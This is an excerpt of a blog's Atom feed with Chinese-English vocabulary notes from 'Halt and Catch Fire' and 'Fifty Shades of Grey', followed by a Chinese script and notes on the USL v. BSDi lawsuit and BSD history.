&lt;span class="n"&gt;salsa&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;墨西哥食物中用番茄、洋蔥做的辣調味汁&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;薩爾薩舞曲&lt;/span&gt;  


&lt;span class="n"&gt;cosmo&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;zmo&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ɔ&lt;/span&gt;&lt;span class="n"&gt;zm&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;pref&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;字首&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;表示宇宙，太空&lt;/span&gt;  


&lt;span class="s"&gt;&amp;quot;confide&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;  
&lt;span class="err"&gt;信賴&lt;/span&gt;  
&lt;span class="n"&gt;ZHUYIN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ㄒㄧㄣˋㄌㄞˋ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;PINYIN&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;xinlai&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  

  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;trust&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;have&lt;/span&gt; &lt;span class="n"&gt;faith&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;depend&lt;/span&gt; &lt;span class="nf"&gt;on&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;upon&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;believe&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;place&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
 &lt;span class="n"&gt;dependence&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Vocabulary"></category><category term="Fifty Shades of Grey"></category><category term="English"></category><category term="Movie"></category></entry><entry><title>Vocabulary of Halt and Catch Fire S02E02 - New Coke</title><link href="https://blog.m157q.tw/posts/2015/06/25/vocabulary-of-halt-and-catch-fire-s02e02-new-coke/" rel="alternate"></link><published>2015-10-27T12:41:00+08:00</published><updated>2015-10-27T12:41:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-06-25:posts/2015/06/25/vocabulary-of-halt-and-catch-fire-s02e02-new-coke/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;abysmal  
KK[əˋbɪzm!] DJ[əˋbizməl]  
a.形容詞  
  1. 深不可測的，無底的  
  2. 【口】糟透的，極壞的  
  3. 極度的  
  4. 似深淵的  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Tropane_alkaloid"&gt;tropane alkaloid&lt;/a&gt; - 莨菪烷生物鹼  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Tropane"&gt;tropane&lt;/a&gt; - 莨菪烷  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;莨菪烷（英語：Tropane）是一種含氮橋環有機化合物，其名稱源於茄科植物莨菪（天仙子）。  
它主要因一類它的名為莨菪烷生物鹼的衍生物而為人們所知，而這類生物鹼包括了許多藥物， 如阿托品和古柯鹼。  
這兩種生物鹼都含有莨菪烷的衍生物托品酮。  
莨菪烷生物鹼主要存在於古柯科植物（包括古柯）與茄科植物（包括曼德拉草、天仙子、顛茄、洋金花、馬鈴薯和番茄）之中。  

莨菪烷分子中的氮橋在1號碳和5號碳之間；儘管莨菪烷有兩個手性碳原子，但由於分子的對稱性，它並沒有光學活性。  

8-氮雜雙環[3.2.1]辛烷（少了一個8位甲基的莨菪烷）被稱作降莨菪烷。  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;alkaloid  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alkaloid  
KK[ˋælkə͵lɔɪd] DJ[ˋælkəlɔid]  
n.名詞  
  1. 【生化】生物鹼  
a.形容詞  
  1. 【生化】生物鹼的；似鹼的  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;nasal membranes - 鼻黏膜  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nasal  
KK[ˋnez!] DJ[ˋneizəl]  
a.形容詞  
  1. 鼻的  
    We breathe through the nasal passage.  
    我們透過鼻腔呼吸。  
  2. 鼻音的  
    His voice is very nasal.  
    他說話鼻音很重。  
n.[C] 可數名詞  
  1. 鼻音；鼻音字母  
  2. 【解】鼻骨  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;membrane  
KK[ˋmɛmbren] DJ[ˋmembrein]  
n.[C][U]  
  1. 【解】膜  
    the mucous membrane  
    黏膜  
  2. 薄膜，膜狀物  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mausoleum  
KK[͵mɔsəˋliəm] DJ[͵mɔ:səˋli:əm]  
n.名詞  
  1. 陵墓  
  2. 陰森森的大廈  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;fossil  
KK[ˋfɑs!] DJ[ˋfɔsl]  
n.[C] 可數名詞  
  1. 化石  
    go fossil hunting  
    搜尋化石去  
  2. 頑固不化的人；守舊的事物  
    She is an old fossil.  
    她是個老頑固。  
a.[B]  
  1. 化石的，成化石的  
  2. 守舊的，陳腐的  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongrel  
KK[ˋmʌŋgrəl] DJ[ˋmʌŋgrəl]  
n.[C] 可數名詞  
  1. 雜種狗；雜種動物；雜交植物  
  2. 【貶】混血兒  
a.形容詞  
  1. 雜種的；雜交的；混血的  
    a mongrel mixture  
    雜種  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;clack  
KK[klæk] DJ[klæk]  
vi.不及物動詞  
  1. 發出嗶剝聲  
  2. 嘮嘮叨叨講  
  3. 發出短而尖銳的碰撞聲  
n.名詞  
  1. 嗶剝聲  
  2. 嘮叨  
  3. 短而尖銳的碰撞聲  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;biological imperatives  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;imperative  
KK[ɪmˋpɛrətɪv] DJ[imˋperətiv]  
a.形容詞  
  1. 必要的；緊急的；極重要的  
    It is imperative to act now.  
    現在必須行動起來。  
  2. 命令式的；必須服從的；專橫的  
    He made an imperative gesture.  
    他做了個命令式的手勢。  
  3. 【語】祈使法的  
    the imperative mood  
    祈使語氣  
n.名詞  
  1. 必須履行的責任；必要的事；需要[C]  
    Job creation has become an imperative for the government.  
    創造就業機會成了政府必須做的事。  
  2. 命令；規則[C]  
    follow the imperatives of history  
    遵從歷史規律  
  3. 【語】祈使語氣[U]；祈使語氣動詞[C]  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;comply  
KK[kəmˋplaɪ] DJ[kəmˋplai]  
vi.不及物動詞  
  1. （對要求、命令等）依從，順從，遵從[（+with）]  
    We comply with all fire safety rules.  
    我們遵守有關消防安全的全部條例。  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;unilateral  
KK[͵junɪˋlætərəl] DJ[ˋju:niˋlætərəl]  
a.形容詞  
  1. 一方的，單邊的；單方面的  
  2. 【植】單側的  
  3. （父母）單系的  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;microfiche machine  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;microfiche  
KK[ˋmaɪkrə͵fiʃ] DJ[ˋmaikrə͵fi:ʃ]  
n.名詞  
  1. 縮影單片；縮微平片  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Vocabulary"></category><category term="Halt and Catch Fire"></category><category term="TV Series"></category><category term="Geek"></category><category term="English"></category></entry><entry><title>Vocabulary of Halt and Catch Fire S02E01 - SETI</title><link href="https://blog.m157q.tw/posts/2015/06/23/vocabulary-of-halt-and-catch-fire-s02e01-seti/" rel="alternate"></link><published>2015-10-27T12:37:00+08:00</published><updated>2015-10-27T12:37:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-06-23:posts/2015/06/23/vocabulary-of-halt-and-catch-fire-s02e01-seti/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;plateau  
KK[plæˋto] DJ[ˋplætəu]  
n.[C] 可數名詞  
  1. 高原  
  2. （上升後的）穩定水準（或時期）  
  3. 【心】學習高原（學習上無進步的停滯期）  
  4. （作擺設用的）碟，托盤；飾匾  
  5. 平頂女帽  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;counterfeit  
KK[ˋkaʊntɚ͵fɪt] DJ[ˋkauntəfit]  
a.形容詞  
  1. 偽造的；假冒的  
    counterfeit passports  
    假護照  
  2. 假裝的，虛偽的  
    counterfeit sorrow  
    假裝的悲傷  
vt.及物動詞  
  1. 偽造；仿造  
    It is a crime to counterfeit money.  
    偽造貨幣是犯罪行為。  
  2. 酷似  
  3. 假裝，偽裝  
vi.不及物動詞  
  1. 從事偽造活動；仿造  
  2. 假裝  
n.[C] 可數名詞  
  1. 偽造物；冒牌貨；仿製品  
    This coin is a counterfeit.  
    這枚硬幣是假的。  
  2. 【廢】騙子  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;scavenger  
KK[ˋskævɪndʒɚ] DJ[ˋskævindʒə]  
n.名詞  
  1. 清掃工  
  2. 食腐動物  
  3. 拾荒者；對骯髒事物有嗜趣者  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pecan  
KK[pɪˋkæn] DJ[piˋkæn]  
n.名詞  
  1. 【植】美洲薄殼胡桃（樹）  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Vocabulary"></category><category term="Halt and Catch Fire"></category><category term="TV Series"></category><category term="Geek"></category><category term="English"></category></entry><entry><title>4BSD 與 AT&amp;T 官司訴訟的影響</title><link href="https://blog.m157q.tw/posts/2015/06/16/4bsd-and-att-lawsuit/" rel="alternate"></link><published>2017-10-02T14:41:00+08:00</published><updated>2017-10-02T14:41:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-06-16:posts/2015/06/16/4bsd-and-att-lawsuit/</id><summary type="html">&lt;p&gt;原連結：&lt;a href="https://fossapc.hackpad.com/B0-1oYaaSKkruW"&gt;https://fossapc.hackpad.com/B0-1oYaaSKkruW&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;影片連結：&lt;a href="https://www.youtube.com/watch?v=LLtj41eyvcA"&gt;https://www.youtube.com/watch?v=LLtj41eyvcA&lt;/a&gt;&lt;br /&gt;
影片下載：&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIaDJXOW9NUnBCYU0/view?usp=sharing"&gt;https://drive.google.com/file/d/0B9cCeTKOkfWIaDJXOW9NUnBCYU0/view?usp=sharing&lt;/a&gt;&lt;br /&gt;
字幕檔下載：&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIeXNHUm9hZGFfckU/view?usp=sharing"&gt;https://drive.google.com/file/d/0B9cCeTKOkfWIeXNHUm9hZGFfckU/view?usp=sharing&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;授權聲明&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;《USL v. BSDi 官司》之影片與字幕檔由 Pellaeon Lin, Chiu Hsiang Hsu, Shun-Yi Jheng 共同製作，&lt;br /&gt;
以創用CC 姓名標示-非商業性-相同方式分享 3.0 台灣 授權條款&lt;br /&gt;
(&lt;a href="http://creativecommons.org/licenses/by-nc-sa/3.0/tw/"&gt;http://creativecommons.org/licenses/by-nc-sa/3.0/tw/&lt;/a&gt;) 釋出。&lt;br /&gt;
此作品衍生自 &lt;a href="https://www.youtube.com"&gt;https://www.youtube.com&lt;/a&gt; 。  &lt;/p&gt;
&lt;h1&gt;影片劇本&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=aurDHyL7bTA"&gt;https://www.youtube.com/watch?v=aurDHyL7bTA&lt;/a&gt;&lt;br /&gt;
不知道能不能做一個類似的短片來介紹...(?  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;背景、角色介紹&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UNIX  &lt;/li&gt;
&lt;li&gt;Berkeley  &lt;/li&gt;
&lt;li&gt;AT&amp;amp;T  &lt;/li&gt;
&lt;li&gt;Introduction  &lt;/li&gt;
&lt;li&gt;subsidiary company  &lt;/li&gt;
&lt;li&gt;USL  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;過程&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整場訴訟的前情提要  &lt;/li&gt;
&lt;li&gt;為什麼要打官司  &lt;/li&gt;
&lt;li&gt;官司內容  &lt;/li&gt;
&lt;li&gt;最後結果  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;影響&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;對照 Linux 的崛起  &lt;/li&gt;
&lt;li&gt;Net/1, Net/2, 386BSD  &lt;/li&gt;
&lt;li&gt;BSD 的後續發展  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;逐字稿&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;【開場】&lt;br /&gt;
今天我們要來介紹 UNIX 家族中很有名的作業系統——BSD 歷史上知名的一場法律戰役，Unix System Laboratories 對上柏克萊大學。  &lt;/p&gt;
&lt;p&gt;【介紹】&lt;br /&gt;
首先來介紹一下 UNIX ，UNIX 是 AT&amp;amp;T Bell labs 於 1969 年開發的作業系統，&lt;br /&gt;
當時的電腦還很昂貴，最知名的系統是 DEC 公司的 PDP 系列，其中最流行的是 PDP-11 ，&lt;br /&gt;
他長這個樣子（show 圖片）。  &lt;/p&gt;
&lt;p&gt;60 年代晚期，美國 AT&amp;amp;T 公司底下的 Bell Labs 與 MIT 和 General Electric 公司，也就是奇異公司，合作開發一套名為 Multics 的作業系統，這套系統源自阿波羅登月計劃所使用的 CTSS 作業系統，&lt;br /&gt;
CTSS 在當時是個很先進的作業系統，全名為 Compatible Time-Sharing System，設計的目標是分時多工，也就是同一時間內，可以讓多個使用者同時執行多個程式，對之後電腦的設計造成重大的影響。  &lt;/p&gt;
&lt;p&gt;但是呢，AT&amp;amp;T Bell Labs 在 1969 年的時候，因為覺得 Multics 的開發進度實在是太慢了，所以退出了這個計畫。有兩位 Bell Labs 的工程師很不開心——Ken Thompson 和 Dennis Ritchie （畫），Ken Thompson 在 Multics 上面開發了一個太空遊戲 Space Travel ，雖然他再也不用繼續開發 Multics 了，但是這樣就沒有遊戲機可以玩了。Thompson 覺得不開心。「不過沒關係」，Ken Thompson 說，「反正 Space Travel 這遊戲在 Multics 這爛作業系統上面也跑的很慢」，「不如我們來開發一個新的作業系統吧！」。超熱血的 Ken Thompson 在辦公室裡面找到一台閒置的 PDP-7 舊電腦，找了一群人開始開發 UNIX 。  &lt;/p&gt;
&lt;p&gt;UNIX 一開始使用組合語言開發，運行於 PDP-7 上面，後來主管覺得 UNIX 真不錯，於是提供更多資源給團隊繼續開發，漸漸地， 公司其他部門也發現 UNIX 比起當時 PDP 系列預載的作業系統好用多了，對於 UNIX 的需求逐漸增加，這也使得 UNIX 有了跨平臺的需求。為了滿足跨平臺的需求，團隊發明了一種新的程式語言——C，並且逐漸將 UNIX 的各個部分使用 C 重寫。  &lt;/p&gt;
&lt;p&gt;後來團隊持續開發，這一系列的 UNIX 稱作 Research UNIX ，也就是早期研究中的 UNIX 。1973 年 11 月，釋出 Research UNIX 第四版，是第一個完整使用 C 語言實作的版本，1974 年 6 月，釋出第五版，這個版本被廣泛授權給教育機構使用——包含柏克萊大學。  &lt;/p&gt;
&lt;p&gt;背景就先講到這邊，接下來我們移動鏡頭，介紹一下 Berkeley 和 CSRG.  &lt;/p&gt;
&lt;p&gt;柏克萊大學 1973 年取得 AT&amp;amp;T 的 UNIX 授權之後，1974年成立了一個研究小組——Computer Systems Research Group ，來修改並改進 UNIX ，在 AT&amp;amp;T 與 Berkeley 的授權協議當中，AT&amp;amp;T 允許 Berkeley 修改原始碼，並且將修改後的原始碼發佈給其他 AT&amp;amp;T UNIX 的使用者，這一系列的發佈就稱作 BSD, Berkeley Software Distribution 。BSD 持續地演進，釋出了 1BSD、2BSD、3BSD、4BSD、4.1BSD 和 4.2 BSD，這些版本都包含 AT&amp;amp;T 原始碼，因此只能提供給 AT&amp;amp;T UNIX 的其他使用者。  &lt;/p&gt;
&lt;p&gt;1980 年的時候，CSRG 接了一個 DARPA 的計劃，DARPA 就是大名鼎鼎的美國國防部高等計劃研究署，當時 DARPA 正在發展 Internet 的前身 ARPANET，DARPA 希望 CSRG 在 UNIX 上面開發 ARPANET 所需的網路功能，包含 TCP/IP 協定，這些功能後來都釋出在 4.3BSD。  &lt;/p&gt;
&lt;p&gt;4.3BSD 當中的 TCP/IP 是當時最完整的實作，因此很多人都想要，在大家的要求下，柏克萊將 4.3BSD 當中 AT&amp;amp;T 的原始碼移除，將它釋出為 4.3BSD Networking Release 1 ，也就是俗稱的 Net/1 ，這是第一個可以公開流通的 BSD 版本。後來，BSD 團隊中的一位開發者提議，將 Net/1 當中 AT&amp;amp;T 的程式用自己的原始碼重新實作，如此一來公開流通的 BSD 就會更加地完整，經過了18個月的開發，BSD 團隊 1991 年6月釋出了 Networking Release 2 , Net/2 。Net2比起 Net/1 新增了很多功能，原本這些功能是 AT&amp;amp;T 所開發因此無法公開，在 Net/2 當中這些部分都由 CSRG 重新實作了。雖然如此， Net/2 仍然不是完整的作業系統，釋出之前 Net/2 的核心裡面仍然包含少數 AT&amp;amp;T 原始檔，團隊決定將這些檔案移除後釋出 Net/2 。Net/2 是 BSD 歷史上很重要的版本，因為後來許多衍生的 BSD 都是基於 Net/2 來開發的，像是 William 和 Lynne Jolitz 夫婦所開發的 386BSD ，即是將 Net/2 當中缺少的部分重新實作，並移植到 Intel 80386 處理器上面再公開釋出的版本。  &lt;/p&gt;
&lt;p&gt;1991 年 Net/2 釋出後，CSRG的核心成員出來開了一家公司——BSDI，Berkeley Software Design, Inc ，將 BSD 打包整合成為一個完整的作業系統，稱做 BSD/OS ，BSDI 販售 BSD/OS 的使用授權和支援服務。  &lt;/p&gt;
&lt;p&gt;這時候 AT&amp;amp;T 不高興了，因為 CSRG 拿 UNIX 的原始碼來修改成 4.3BSD Net/2 ，BSDI 又再拿 Net/2 包裝成 BSD/OS ，再拿去賣。當時的 BSD/OS 授權及原始碼，只要 995 美金，但是功能幾乎完全一樣的 AT&amp;amp;T UNIX/32V 要價超過 20000 美元，AT&amp;amp;T 的顧客都被搶走了。&lt;br /&gt;
雖然 Berkeley 認為他們已經將 AT&amp;amp;T 的原始碼都移除了，但是 AT&amp;amp;T 認為還是有侵權 ，於是1992年的時候透過他們的子公司 UNIX System Laboratories ，USL 對 BSDI 公司提出了告訴。  &lt;/p&gt;
&lt;p&gt;原告 USL 認為柏克萊大學釋出的 Net/2 當中部分檔案是 USL 的智慧財產，但是柏克萊認為他們已經移除所有 USL 的檔案。而雙方的爭議就在於，當時 AT&amp;amp;T 為了要推廣 UNIX ，默許部分的 UNIX 原始碼公開在教科書內，因此柏克萊認為這可以視為 AT&amp;amp;T 允許這些原始碼的公開流通，而 AT&amp;amp;T 不這麼認為。&lt;br /&gt;
並且，柏克萊認為他們釋出的部分原始碼屬於合理使用範圍，這些原始碼是 POSIX 規範的實作，幾乎只能有一種實作方法，因此他們使用這部分的原始碼不算侵權。這邊補充解釋一下 POSIX ，POSIX 是一套作業系統 API 的規範，宗旨在於希望各種不同的作業系統間至少能夠維持基本的相容性。&lt;br /&gt;
最後，柏克萊還說，USL 所聲稱的這些屬於他們的檔案，僅佔 Net/2 的極小部分，因此 Net/2 不能算是 UNIX/32V 的衍生作品。  &lt;/p&gt;
&lt;p&gt;訴訟進行了一年，後來 1993 年雙方在法庭外和解。和解的雙方同意不再針對此一案件進行後續法律行動。和解的條件有好幾項，但是最重要的是，柏克萊會將極少數的侵權檔案移除或修改，在 BSD 一萬八千個檔案中，柏克萊只需刪除其中3個，並且將其中70個加上 USL 的版權宣告，整個和解的結果大致是對 BSD 有利的。  &lt;/p&gt;
&lt;p&gt;訴訟之後，柏克萊1994 年釋出了下一版本的 BSD —— 4.4BSD ，4.4 BSD 又再分為兩個版本，4.4BSD-Lite 以及 4.4BSD-Encumbered ，其中 4.4BSD-Lite 是不包含任何 AT&amp;amp;T 原始碼的版本，允許公開流通；而 4.4BSD-Encumbered 則包含了 AT&amp;amp;T 原始碼，僅提供給 AT&amp;amp;T UNIX 合法授權的使用者使用。  &lt;/p&gt;
&lt;p&gt;1995 年的時候，柏克萊釋出了最後一版的 BSD—— 4.4BSD-Lite Release 2 ，釋出之後 CSRG 就解散了，柏克萊大學不再繼續開發BSD 。不過，解散的這群人，他們又各自發起了新的開發計劃，大部分都是基於 4.4BSD-Lite ，以及 Jolitz 夫婦所開發的 386BSD 。這些新計劃大多都延續到今日，有 FreeBSD 和 NetBSD ，後來 FreeBSD 又分支出 DragonflyBSD ，NetBSD 又分支出 OpenBSD 。  &lt;/p&gt;
&lt;p&gt;今天，FreeBSD 是 BSD 家族中最受歡迎的版本，而其他的 BSD 也都有在持續的開發並釋出新版本。  &lt;/p&gt;
&lt;p&gt;BSD 家族的故事就講到這邊了。  &lt;/p&gt;
&lt;h1&gt;過程&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;USL 1992 年提起訴訟，1994年和解，和解條件2004年公開  &lt;/li&gt;
&lt;li&gt;USL 原訴：  &lt;/li&gt;
&lt;li&gt;Berkeley 釋出的 NET-2 違反了 USL 和 Berkeley 的軟體授權協議以及 USL 對 UNIX 的著作權  &lt;/li&gt;
&lt;li&gt;等等，都是關於 NET-2  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://goo.gl/kA97T6"&gt;UNIX System Laboratories, Inc. v. Berkeley Software Design, Inc.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;em&gt;USL v. BSDi&lt;/em&gt;&lt;/strong&gt; was a &lt;a href="https://en.wikipedia.org/wiki/Lawsuit"&gt;lawsuit&lt;/a&gt; brought in the United States in 1992 by &lt;a href="https://en.wikipedia.org/wiki/Unix_System_Laboratories"&gt;Unix System Laboratories&lt;/a&gt; against &lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Design"&gt;Berkeley Software Design&lt;/a&gt;, Inc and the &lt;a href="https://en.wikipedia.org/wiki/Regents_of_the_University_of_California"&gt;Regents of the University of California&lt;/a&gt; over &lt;a href="https://en.wikipedia.org/wiki/Intellectual_property"&gt;intellectual property&lt;/a&gt; related to &lt;a href="https://en.wikipedia.org/wiki/Unix"&gt;UNIX&lt;/a&gt;.  The case was settled out of court in 1993 after the judge expressed  doubt in the validity of USL's intellectual property, with Novell (who  by that time had bought USL) and BSDi agreeing not to litigate further  over the &lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution"&gt;Berkeley Software Distribution&lt;/a&gt; (BSD), which would later develop into a &lt;a href="https://en.wikipedia.org/wiki/Comparison_of_BSD_operating_systems"&gt;range of BSD&lt;/a&gt; distributions, each tuned to its own specific audience's strengths and markets.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution"&gt;Berkeley Software Distribution&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Historically, BSD has been considered a branch of Unix, &lt;strong&gt;Berkeley Unix&lt;/strong&gt;, because it shared the initial codebase and design with the original &lt;a href="https://en.wikipedia.org/wiki/AT%26T"&gt;AT&amp;amp;T&lt;/a&gt; Unix operating system.  &lt;/li&gt;
&lt;li&gt;4.1BSD (June 1981) was a response to criticisms of BSD's performance relative to the dominant VAX operating system, &lt;a href="https://en.wikipedia.org/wiki/OpenVMS"&gt;VMS&lt;/a&gt;. The 4.1BSD kernel was systematically tuned up by &lt;a href="https://en.wikipedia.org/wiki/Bill_Joy"&gt;Bill Joy&lt;/a&gt; until it could perform as well as VMS on several benchmarks. The release would have been called &lt;em&gt;5BSD&lt;/em&gt;, but after objections from &lt;a href="https://en.wikipedia.org/wiki/AT%26T"&gt;AT&amp;amp;T&lt;/a&gt; the name was changed; AT&amp;amp;T feared confusion with &lt;a href="https://en.wikipedia.org/wiki/AT%26T"&gt;AT&amp;amp;T&lt;/a&gt;'s &lt;a href="https://en.wikipedia.org/wiki/UNIX_System_V"&gt;UNIX System V&lt;/a&gt;.  &lt;/li&gt;
&lt;li&gt;Net/1  &lt;ul&gt;
&lt;li&gt;Until then, all versions of BSD incorporated proprietary AT&amp;amp;T Unix  code and were, therefore, subject to an AT&amp;amp;T software license.  Source code licenses had become very expensive and several outside  parties had expressed interest in a separate release of the networking  code, which had been developed entirely outside AT&amp;amp;T and would not  be subject to the licensing requirement. This led to &lt;strong&gt;Networking Release 1&lt;/strong&gt; (&lt;strong&gt;Net/1&lt;/strong&gt;), which was made available to non-licensees of AT&amp;amp;T code and was &lt;a href="https://en.wikipedia.org/wiki/Free_software"&gt;freely redistributable&lt;/a&gt; under the terms of the &lt;a 